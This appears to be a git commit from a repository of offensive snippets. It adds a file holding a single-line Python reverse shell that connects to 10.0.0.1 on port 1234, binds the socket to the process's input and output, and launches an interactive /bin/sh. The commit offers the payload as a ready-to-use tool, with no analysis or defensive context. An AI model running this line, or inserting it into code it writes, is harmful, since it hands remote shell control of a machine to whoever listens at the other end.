42cffe82445ef2cffed22773c973fae7d72dff3a
Prateek Yadav <55643849+kkYrusobad@users.noreply.github.com>
2021-10-08 06:38:49 +0530

    python one liner reverse shell

---
+++ PYTHON/pythonrevshell.py
@@ -0,0 +1,1 @@
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
